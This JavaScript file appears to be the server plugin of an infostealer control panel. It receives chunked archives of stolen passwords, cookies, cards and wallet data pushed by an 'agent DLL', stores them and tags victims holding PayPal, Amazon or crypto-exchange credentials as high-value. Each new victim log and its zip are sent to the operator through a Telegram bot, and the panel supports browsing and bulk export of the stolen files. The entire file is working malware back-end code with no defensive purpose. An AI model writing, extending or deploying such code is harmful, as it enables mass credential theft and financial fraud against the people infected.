import fs from "fs";
import path from "path";
import zlib from "node:zlib";

/* ──────────────────────────────────────────────
   xfill server plugin — receive/reassemble/store
   credential archives pushed by the agent DLL.
   ────────────────────────────────────────────── */

// In-memory chunk reassembly buffers keyed by `${clientId}:${session}`
const pending = new Map();

function bufferKey(clientId, session) {
  return `${clientId}:${session}`;
}

function safeSegment(value) {
  const s = String(value ?? "");
  if (!/^[A-Za-z0-9_.-]+$/.test(s) || s.includes("..")) {
    throw new Error(`Unsafe path segment: ${s.slice(0, 64)}`);
  }
  return s;
}

function archivePath(ctx, clientId, session) {
  return path.join(ctx.dataDir, safeSegment(clientId), `${safeSegment(session)}.zip`);
}

function rowToJson(row) {
  let info = null;
  let tags = [];
  try {
    info = JSON.parse(row.info_json);
  } catch {}
  try {
    tags = JSON.parse(row.tags || "[]");
  } catch {}
  return {
    id: row.id,
    clientId: row.client_id,
    session: row.session,
    filename: row.filename,
    size: row.size,
    createdAt: row.created_at,
    seen: !!row.seen,
    tags,
    info,
  };
}

/* ──────────────────────────────────────────────
   High-value target tagging (drives client-card badges)
   ────────────────────────────────────────────── */

const TAG_DOMAIN_RULES = [
  { tag: "paypal", needles: ["paypal.com", "paypalobjects.com"] },
  { tag: "amazon", needles: ["amazon."] },
  {
    tag: "crypto-exchange",
    needles: ["binance.", "coinbase.", "kraken.", "bybit.", "okx.", "kucoin.", "crypto.com", "bitstamp.", "gemini.", "bitfinex.", "gate.io", "upbit.", "bitget.", "htx.", "mexc."],
  },
];

/// Scan an assembled archive for high-value indicators: credential/cookie
/// domains plus wallet/extension presence from Info.json.
function computeTags(zipBuf, info) {
  const tags = new Set();
  try {
    const zip = parseZip(zipBuf);
    for (const entry of zip.entries) {
      const base = entry.path.split("/").pop();
      if (base !== "Passwords.json" && base !== "Cookies.json") continue;
      if (entry.size > 32 * 1024 * 1024) continue;
      let rows;
      try {
        rows = JSON.parse(extractZipEntry(zip, entry.path).toString("utf8").replace(/^﻿/, ""));
      } catch {
        continue;
      }
      if (!Array.isArray(rows)) continue;
      for (const row of rows) {
        const host = String(row?.Hostname || row?.domain || "").toLowerCase();
        if (!host) continue;
        for (const rule of TAG_DOMAIN_RULES) {
          if (rule.needles.some((n) => host.includes(n))) tags.add(rule.tag);
        }
      }
    }
  } catch {}
  if (Array.isArray(info?.DesktopWallets) && info.DesktopWallets.length > 0) tags.add("crypto-wallet");
  if (Array.isArray(info?.BrowserExtensions) && info.BrowserExtensions.length > 0) tags.add("crypto-wallet");
  return [...tags];
}

/* ──────────────────────────────────────────────
   Session finalization (tolerant of out-of-order
   chunk/complete delivery by the agent host)
   ────────────────────────────────────────────── */

const FINALIZE_MAX_ATTEMPTS = 20;
const FINALIZE_RETRY_MS = 250;

async function finalizeSession(ctx, clientId, session) {
  const key = bufferKey(clientId, session);
  const buf = pending.get(key);
  if (!buf || !buf.complete) return;
  // Guard against the retry timer racing the direct completion path.
  if (buf.finalized) return;
  buf.finalized = true;

  const payload = buf.complete;
  const expectedChunks = Number(payload?.chunks);
  const total = Number.isInteger(expectedChunks) ? expectedChunks : buf.total;
  let missing = -1;
  for (let i = 0; i < total; i++) {
    if (typeof buf.chunks.get(i) !== "string") {
      missing = i;
      break;
    }
  }
  if (missing >= 0) {
    buf.attempts += 1;
    if (buf.attempts <= FINALIZE_MAX_ATTEMPTS) {
      setTimeout(() => finalizeSession(ctx, clientId, session), FINALIZE_RETRY_MS);
      return;
    }
    const message = `missing chunk ${missing}/${total}`;
    ctx.log.error(`xfill_complete failed for ${clientId} session ${session}: ${message}`);
    ctx.broadcast("collect_error", { clientId, stage: "assemble", message });
    pending.delete(key);
    return;
  }

  try {
    const parts = [];
    for (let i = 0; i < total; i++) {
      parts.push(Buffer.from(buf.chunks.get(i), "base64"));
    }
    const zip = Buffer.concat(parts);
    const declared = Number(payload?.size);
    if (Number.isFinite(declared) && declared !== zip.length) {
      ctx.log.warn(`xfill_complete: size mismatch (declared ${declared}, got ${zip.length}) from ${clientId}`);
    }

    const target = archivePath(ctx, clientId, session);
    fs.mkdirSync(path.dirname(target), { recursive: true });
    fs.writeFileSync(target, zip);

    // Fill in Country via GeoIP when the agent couldn't resolve it.
    const info = await enrichCountry(ctx, payload?.info ?? null);
    // FirstTime = this client has never delivered an archive before.
    const prior = ctx.db
      .prepare("SELECT COUNT(*) AS n FROM archives WHERE client_id = ?")
      .get(String(clientId));
    if (info && typeof info === "object") info.FirstTime = (prior?.n ?? 0) === 0;

    const tags = computeTags(zip, info);
    const createdAt = new Date().toISOString();
    const filename = `${session}.zip`;
    const result = ctx.db
      .prepare("INSERT INTO archives(client_id, session, filename, size, created_at, info_json, tags) VALUES (?, ?, ?, ?, ?, ?, ?)")
      .run(String(clientId), session, filename, zip.length, createdAt, JSON.stringify(info), JSON.stringify(tags));

    const row = ctx.db.prepare("SELECT * FROM archives WHERE id = ?").get(result.lastInsertRowid);
    ctx.broadcast("archive_added", rowToJson(row));
    ctx.log.info(`xfill archive stored: ${clientId} session ${session} (${zip.length} bytes)`);

    // Telegram: message + the zip itself (server-side only).
    const hwid = info?.HWID || String(clientId).slice(0, 10);
    await sendTelegramNotification(ctx, info, zip, `${hwid}_${session}.zip`);
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    ctx.log.error(`xfill_complete failed for ${clientId} session ${session}: ${message}`);
    ctx.broadcast("collect_error", { clientId, stage: "assemble", message });
  } finally {
    pending.delete(key);
  }
}

/* ──────────────────────────────────────────────
   Minimal ZIP reader (central directory based)
   ────────────────────────────────────────────── */

function parseZip(buf) {
  if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);
  // Locate End of Central Directory record (sig 0x06054b50)
  const minEocd = 22;
  let eocd = -1;
  const start = Math.max(0, buf.length - minEocd - 0xffff);
  for (let i = buf.length - minEocd; i >= start; i--) {
    if (buf.readUInt32LE(i) === 0x06054b50) {
      eocd = i;
      break;
    }
  }
  if (eocd < 0) throw new Error("Not a zip file (EOCD not found)");

  const count = buf.readUInt16LE(eocd + 10);
  const cdOffset = buf.readUInt32LE(eocd + 16);

  const entries = [];
  let p = cdOffset;
  for (let i = 0; i < count; i++) {
    if (buf.readUInt32LE(p) !== 0x02014b50) throw new Error("Bad central directory");
    const method = buf.readUInt16LE(p + 10);
    const compressed = buf.readUInt32LE(p + 20);
    const size = buf.readUInt32LE(p + 24);
    const nameLen = buf.readUInt16LE(p + 28);
    const extraLen = buf.readUInt16LE(p + 30);
    const commentLen = buf.readUInt16LE(p + 32);
    const localOffset = buf.readUInt32LE(p + 42);
    const name = buf.toString("utf8", p + 46, p + 46 + nameLen);
    entries.push({ path: name, size, compressed, method, localOffset });
    p += 46 + nameLen + extraLen + commentLen;
  }
  return { buf, entries };
}

function extractZipEntry(zip, entryPath) {
  const entry = zip.entries.find((e) => e.path === entryPath);
  if (!entry) throw new Error(`File not found in archive: ${entryPath}`);
  const buf = zip.buf;
  const off = entry.localOffset;
  if (buf.readUInt32LE(off) !== 0x04034b50) throw new Error("Bad local header");
  const nameLen = buf.readUInt16LE(off + 26);
  const extraLen = buf.readUInt16LE(off + 28);
  const dataStart = off + 30 + nameLen + extraLen;
  const raw = buf.subarray(dataStart, dataStart + entry.compressed);
  if (entry.method === 0) return Buffer.from(raw);
  if (entry.method === 8) return zlib.inflateRawSync(raw);
  throw new Error(`Unsupported compression method ${entry.method}`);
}

/* ──────────────────────────────────────────────
   Minimal ZIP writer (store-or-deflate)
   ────────────────────────────────────────────── */

const CRC_TABLE = (() => {
  const table = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) {
      c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    }
    table[n] = c >>> 0;
  }
  return table;
})();

function crc32(buf) {
  let crc = 0xffffffff;
  for (let i = 0; i < buf.length; i++) {
    crc = CRC_TABLE[(crc ^ buf[i]) & 0xff] ^ (crc >>> 8);
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function dosDateTime(date) {
  const d = date || new Date();
  const time = ((d.getHours() << 11) | (d.getMinutes() << 5) | (d.getSeconds() >> 1)) & 0xffff;
  const day = (((Math.max(1980, d.getFullYear()) - 1980) << 9) | ((d.getMonth() + 1) << 5) | d.getDate()) & 0xffff;
  return { time, day };
}

function buildZip(files) {
  // files: [{ name: string, data: Buffer }]
  const { time, day } = dosDateTime(new Date());
  const chunks = [];
  const central = [];
  let offset = 0;

  for (const file of files) {
    const nameBuf = Buffer.from(file.name.replace(/\\/g, "/"), "utf8");
    const data = Buffer.isBuffer(file.data) ? file.data : Buffer.from(file.data);
    let method = 0;
    let payload = data;
    if (data.length > 0) {
      const deflated = zlib.deflateRawSync(data, { level: 6 });
      if (deflated.length < data.length) {
        method = 8;
        payload = deflated;
      }
    }
    const crc = crc32(data);

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4); // version needed
    local.writeUInt16LE(0x0800, 6); // UTF-8 filename flag
    local.writeUInt16LE(method, 8);
    local.writeUInt16LE(time, 10);
    local.writeUInt16LE(day, 12);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(payload.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28); // extra len
    chunks.push(local, nameBuf, payload);

    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt16LE(20, 4); // version made by
    cd.writeUInt16LE(20, 6); // version needed
    cd.writeUInt16LE(0x0800, 8); // UTF-8 filename flag
    cd.writeUInt16LE(method, 10);
    cd.writeUInt16LE(time, 12);
    cd.writeUInt16LE(day, 14);
    cd.writeUInt32LE(crc, 16);
    cd.writeUInt32LE(payload.length, 20);
    cd.writeUInt32LE(data.length, 24);
    cd.writeUInt16LE(nameBuf.length, 28);
    // extra len, comment len, disk start, internal attrs = 0
    cd.writeUInt32LE(0, 38); // external attrs
    cd.writeUInt32LE(offset, 42); // local header offset
    central.push(Buffer.concat([cd, nameBuf]));

    offset += 30 + nameBuf.length + payload.length;
  }

  const cdBuf = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20); // comment len

  return Buffer.concat([...chunks, cdBuf, eocd]);
}

/* ──────────────────────────────────────────────
   Helpers
   ────────────────────────────────────────────── */

function loadRow(ctx, id) {
  const row = ctx.db.prepare("SELECT * FROM archives WHERE id = ?").get(id);
  if (!row) throw new Error(`Archive ${id} not found`);
  return row;
}

function readArchiveZip(ctx, row) {
  const file = archivePath(ctx, row.client_id, row.session);
  if (!fs.existsSync(file)) throw new Error("Archive file missing on disk");
  return parseZip(fs.readFileSync(file));
}

function looksBinary(buf) {
  if (buf.length === 0) return false;
  const sample = buf.subarray(0, Math.min(buf.length, 8192));
  let control = 0;
  for (const b of sample) {
    if ((b < 32 && b !== 9 && b !== 10 && b !== 13) || b === 0x7f) control++;
  }
  return control / sample.length > 0.1;
}

function exportFolderName(info, row) {
  const base = `${info?.Username || "unknown"}_${info?.HWID || row.client_id}`;
  const cleaned = base.replace(/[^A-Za-z0-9_.-]+/g, "_").replace(/^\.+/, "");
  return cleaned || `archive_${row.id}`;
}

/* ──────────────────────────────────────────────
   Telegram notifications (server-side only)
   ────────────────────────────────────────────── */

function getSetting(ctx, key) {
  const row = ctx.db.prepare("SELECT value FROM settings WHERE key = ?").get(key);
  return row ? row.value : "";
}

function setSetting(ctx, key, value) {
  ctx.db
    .prepare("INSERT INTO settings(key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")
    .run(key, String(value ?? ""));
}

function countryFlag(code) {
  const cc = String(code || "").trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc)) return "🏳️";
  return String.fromCodePoint(...[...cc].map((c) => 0x1f1e6 + c.charCodeAt(0) - 65));
}

function fmtTelegramTime(iso) {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return "";
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
}

function buildTelegramMessage(info) {
  const i = info || {};
  const wallets = Array.isArray(i.DesktopWallets) ? i.DesktopWallets.length : 0;
  const apps = Array.isArray(i.Apps) ? i.Apps.length : 0;
  return [
    "🆕 New Log Received! ✅",
    "",
    `👤 ${i.Username || "unknown"} (${i.HWID || "?"})`,
    `${countryFlag(i.Country)} ${i.Country || "??"} • 🌐 ${i.IpAddress || "?"}`,
    `📅 ${fmtTelegramTime(i.CreatedAt)} • 📦 v${i.Version || "?"}`,
    `📁 ${i.Group || "Default"}`,
    "",
    "📊 Data:",
    `🔑 Passwords: ${i.PasswordsCount ?? 0}`,
    `🍪 Cookies: ${i.CookiesCount ?? 0}`,
    `💳 Cards: ${i.CreditCardsCount ?? 0}`,
    `🧩 Extensions: ${i.BrowserExtensionsCount ?? 0}`,
    `💰 Wallets: ${wallets}`,
    `📱 Apps: ${apps}`,
    "",
    `🔍 Domains: ${i.HistoryCount ?? 0}`,
  ].join("\n");
}

async function telegramApi(ctx, method, body) {
  const token = getSetting(ctx, "telegram_token");
  if (!token) throw new Error("Telegram bot token not configured");
  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    body,
  });
  const json = await res.json().catch(() => ({}));
  if (!res.ok || json.ok === false) {
    throw new Error(json.description || `Telegram API ${res.status}`);
  }
  return json;
}

async function sendTelegramNotification(ctx, info, zip, zipName) {
  if (getSetting(ctx, "telegram_enabled") !== "1") return;
  const chatId = getSetting(ctx, "telegram_chat_id");
  if (!chatId) return;

  try {
    const msgForm = new FormData();
    msgForm.append("chat_id", chatId);
    let text = buildTelegramMessage(info);
    // Bot API sendDocument limit is 50 MB — oversized archives get the
    // message only, with a note that the zip is in the panel.
    const tooBig = zip.length > 45 * 1024 * 1024;
    if (tooBig) text += `\n\n⚠️ Archive too large for Telegram (${Math.round(zip.length / 1e6)} MB) — grab it from the xfill tab.`;
    msgForm.append("text", text);
    await telegramApi(ctx, "sendMessage", msgForm);

    if (tooBig) return;
    const docForm = new FormData();
    docForm.append("chat_id", chatId);
    docForm.append("document", new Blob([zip], { type: "application/zip" }), zipName);
    await telegramApi(ctx, "sendDocument", docForm);
    ctx.log.info(`telegram notification sent for ${zipName}`);
  } catch (err) {
    ctx.log.warn(`telegram notification failed: ${err instanceof Error ? err.message : err}`);
  }
}

/// Best-effort GeoIP enrichment when the agent left Country empty.
async function enrichCountry(ctx, info) {
  if (!info || info.Country || !info.IpAddress) return info;
  try {
    const res = await fetch(`https://ip-api.com/json/${encodeURIComponent(info.IpAddress)}?fields=status,countryCode`, {
      signal: AbortSignal.timeout(4000),
    });
    const json = await res.json();
    if (json?.status === "success" && json.countryCode) info.Country = json.countryCode;
  } catch {}
  return info;
}

/* ──────────────────────────────────────────────
   Plugin exports
   ────────────────────────────────────────────── */

export { parseZip, extractZipEntry, buildZip, crc32 };

export default {
  setup(ctx) {
    ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS archives (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT,
        session INTEGER,
        filename TEXT,
        size INTEGER,
        created_at TEXT,
        info_json TEXT,
        seen INTEGER DEFAULT 0,
        tags TEXT DEFAULT '[]'
      );
      CREATE INDEX IF NOT EXISTS archives_created ON archives(created_at DESC);
      CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
      );
    `);
    // Migration for databases created before the seen column existed.
    try {
      ctx.db.exec("ALTER TABLE archives ADD COLUMN seen INTEGER DEFAULT 0");
    } catch {}
    try {
      ctx.db.exec("ALTER TABLE archives ADD COLUMN tags TEXT DEFAULT '[]'");
    } catch {}
    fs.mkdirSync(ctx.dataDir, { recursive: true });
    ctx.log.info("xfill plugin ready");
  },

  teardown() {
    pending.clear();
  },

  onEvent(ctx, clientId, event, payload) {
    if (event === "xfill_chunk") {
      const session = Number(payload?.session);
      const index = Number(payload?.index);
      const total = Number(payload?.total);
      if (!Number.isFinite(session) || !Number.isInteger(index) || !Number.isInteger(total) || typeof payload?.data !== "string") {
        ctx.log.warn(`xfill_chunk: malformed payload from ${clientId}`);
        return;
      }
      const key = bufferKey(clientId, session);
      let buf = pending.get(key);
      if (!buf || buf.total !== total) {
        // Bound server memory: cap concurrent sessions, drop stale ones.
        const now = Date.now();
        for (const [k, b] of pending) {
          if (now - b.startedAt > 10 * 60 * 1000) pending.delete(k);
        }
        if (pending.size >= 64) {
          const oldest = [...pending.entries()].sort((a, b) => a[1].startedAt - b[1].startedAt)[0];
          if (oldest) pending.delete(oldest[0]);
        }
        buf = { total, chunks: new Map(), startedAt: now, complete: null, attempts: 0 };
        pending.set(key, buf);
      }
      // Per-chunk sanity caps: index in range, payload ≤ ~4 MB base64 (2 MiB raw).
      if (index >= total || payload.data.length > 4 * 1024 * 1024) {
        ctx.log.warn(`xfill_chunk: out-of-range chunk from ${clientId}`);
        return;
      }
      buf.chunks.set(index, payload.data);
      // The agent host sends each event on its own goroutine, so wire order is
      // not guaranteed; if a complete arrived early, this chunk may finish it.
      if (buf.complete) finalizeSession(ctx, clientId, session);
      return;
    }

    if (event === "xfill_complete") {
      const session = Number(payload?.session);
      const key = bufferKey(clientId, session);
      let buf = pending.get(key);
      if (!buf) {
        buf = { total: Number(payload?.chunks) || 0, chunks: new Map(), startedAt: Date.now(), complete: null, attempts: 0 };
        pending.set(key, buf);
      }
      buf.complete = payload ?? {};
      finalizeSession(ctx, clientId, session);
      return;
    }

    if (event === "xfill_progress") {
      ctx.broadcast("progress", { clientId, stage: String(payload?.stage ?? "") });
      return;
    }

    if (event === "xfill_error") {
      ctx.broadcast("collect_error", {
        clientId,
        stage: String(payload?.stage ?? ""),
        message: String(payload?.message ?? "unknown error"),
      });
      return;
    }
  },

  rpc: {
    dashboardContributions(ctx, params) {
      const clientIds = Array.isArray(params?.clientIds) ? params.clientIds : [];
      const contributions = [];
      const stmt = ctx.db.prepare(
        "SELECT tags FROM archives WHERE client_id = ? ORDER BY id DESC LIMIT 1"
      );
      for (const clientId of clientIds) {
        const row = stmt.get(String(clientId));
        let tags = [];
        try {
          tags = JSON.parse(row?.tags || "[]");
        } catch {}
        if (!Array.isArray(tags) || tags.length === 0) continue;
        const badges = [];
        if (tags.includes("paypal"))
          badges.push({ id: "xfill-paypal", label: "PayPal", title: "PayPal credentials/cookies in xfill log", icon: "fa-brands fa-paypal", tone: "warn", priority: 96 });
        if (tags.includes("amazon"))
          badges.push({ id: "xfill-amazon", label: "Amazon", title: "Amazon credentials/cookies in xfill log", icon: "fa-brands fa-amazon", tone: "warn", priority: 95 });
        if (tags.includes("crypto-exchange"))
          badges.push({ id: "xfill-exchange", label: "Exchange", title: "Crypto exchange credentials/cookies in xfill log", icon: "fa-solid fa-arrow-trend-up", tone: "good", priority: 94 });
        if (tags.includes("crypto-wallet"))
          badges.push({ id: "xfill-wallet", label: "Wallet", title: "Crypto wallet data in xfill log", icon: "fa-solid fa-wallet", tone: "good", priority: 93 });
        contributions.push({ clientId, badges });
      }
      return { contributions };
    },

    getSettings(ctx) {
      const token = getSetting(ctx, "telegram_token");
      return {
        telegramEnabled: getSetting(ctx, "telegram_enabled") === "1",
        telegramChatId: getSetting(ctx, "telegram_chat_id"),
        telegramTokenSet: !!token,
        telegramTokenPreview: token ? `${token.slice(0, 6)}…${token.slice(-4)}` : "",
      };
    },

    setSettings(ctx, params) {
      if (typeof params?.telegramToken === "string" && params.telegramToken.trim()) {
        setSetting(ctx, "telegram_token", params.telegramToken.trim());
      }
      if (typeof params?.telegramChatId === "string") {
        setSetting(ctx, "telegram_chat_id", params.telegramChatId.trim());
      }
      if (typeof params?.telegramEnabled === "boolean") {
        setSetting(ctx, "telegram_enabled", params.telegramEnabled ? "1" : "0");
      }
      return { ok: true };
    },

    async testTelegram(ctx) {
      const chatId = getSetting(ctx, "telegram_chat_id");
      if (!chatId) throw new Error("Chat ID not configured");
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("text", "✅ xfill test notification — Telegram delivery is working.");
      await telegramApi(ctx, "sendMessage", form);
      return { ok: true };
    },

    list(ctx) {
      const rows = ctx.db.prepare("SELECT * FROM archives ORDER BY id DESC").all();
      return rows.map(rowToJson);
    },

    remove(ctx, params) {
      const ids = Array.isArray(params?.ids) ? params.ids : [];
      let removed = 0;
      for (const id of ids) {
        const row = ctx.db.prepare("SELECT * FROM archives WHERE id = ?").get(id);
        if (!row) continue;
        try {
          fs.unlinkSync(archivePath(ctx, row.client_id, row.session));
        } catch {}
        ctx.db.prepare("DELETE FROM archives WHERE id = ?").run(id);
        removed++;
      }
      return { removed };
    },

    // Duplicates = same client+session (double-finalize race) or same client
    // with byte-identical archive size within 2 minutes (auto+manual double
    // collect). Keeps the first (lowest id) of each group.
    dedupe(ctx) {
      const rows = ctx.db.prepare("SELECT * FROM archives ORDER BY id ASC").all();
      const seenSession = new Set();
      const lastByClient = new Map();
      const doomed = [];
      for (const r of rows) {
        const skey = `${r.client_id}:${r.session}`;
        if (seenSession.has(skey)) {
          doomed.push(r);
          continue;
        }
        seenSession.add(skey);
        const last = lastByClient.get(r.client_id);
        if (
          last &&
          last.size === r.size &&
          Math.abs(new Date(r.created_at) - new Date(last.created_at)) < 120000
        ) {
          doomed.push(r);
          continue;
        }
        lastByClient.set(r.client_id, r);
      }
      for (const r of doomed) {
        try {
          fs.unlinkSync(archivePath(ctx, r.client_id, r.session));
        } catch {}
        ctx.db.prepare("DELETE FROM archives WHERE id = ?").run(r.id);
      }
      return { removed: doomed.length };
    },

    /// Recompute tags for every stored archive (backfills badges for logs
    /// ingested before tagging existed).
    rescanTags(ctx) {
      const rows = ctx.db.prepare("SELECT * FROM archives").all();
      let updated = 0;
      for (const row of rows) {
        try {
          const zip = readArchiveZip(ctx, row);
          let info = null;
          try {
            info = JSON.parse(row.info_json);
          } catch {}
          const tags = computeTags(zip.buf, info);
          ctx.db.prepare("UPDATE archives SET tags = ? WHERE id = ?").run(JSON.stringify(tags), row.id);
          updated++;
        } catch {}
      }
      return { updated };
    },

    clear(ctx) {
      const rows = ctx.db.prepare("SELECT * FROM archives").all();
      for (const row of rows) {
        try {
          fs.unlinkSync(archivePath(ctx, row.client_id, row.session));
        } catch {}
      }
      ctx.db.exec("DELETE FROM archives");
      return { removed: rows.length };
    },

    setSeen(ctx, params) {
      const ids = Array.isArray(params?.ids) ? params.ids : [];
      const seen = params?.seen ? 1 : 0;
      const stmt = ctx.db.prepare("UPDATE archives SET seen = ? WHERE id = ?");
      let updated = 0;
      for (const id of ids) updated += stmt.run(seen, id).changes;
      return { updated, seen: !!seen };
    },

    tree(ctx, params) {
      const row = loadRow(ctx, Number(params?.id));
      const zip = readArchiveZip(ctx, row);
      return zip.entries.map((e) => ({ path: e.path, size: e.size, compressed: e.compressed }));
    },

    file(ctx, params) {
      const row = loadRow(ctx, Number(params?.id));
      const zip = readArchiveZip(ctx, row);
      const data = extractZipEntry(zip, String(params?.path ?? ""));
      if (looksBinary(data)) {
        return { path: String(params?.path), size: data.length, base64: data.toString("base64") };
      }
      return { path: String(params?.path), size: data.length, text: data.toString("utf8") };
    },

    exportMany(ctx, params) {
      const ids = Array.isArray(params?.ids) ? params.ids : [];
      if (ids.length === 0) throw new Error("No archives selected");
      const files = [];
      for (const id of ids) {
        const row = ctx.db.prepare("SELECT * FROM archives WHERE id = ?").get(id);
        if (!row) continue;
        let info = null;
        try {
          info = JSON.parse(row.info_json);
        } catch {}
        const folder = exportFolderName(info, row);
        const zip = readArchiveZip(ctx, row);
        for (const entry of zip.entries) {
          if (entry.path.endsWith("/")) continue;
          files.push({
            name: `${folder}/${entry.path.replace(/\\/g, "/")}`,
            data: extractZipEntry(zip, entry.path),
          });
        }
      }
      if (files.length === 0) throw new Error("Nothing to export");

      const filename = `xfill-export-${Date.now()}.zip`;
      const exportsDir = path.join(ctx.dataDir, "exports");
      fs.mkdirSync(exportsDir, { recursive: true });
      fs.writeFileSync(path.join(exportsDir, filename), buildZip(files));
      ctx.log.info(`xfill export written: ${filename} (${files.length} files)`);
      return { filename };
    },
  },
};
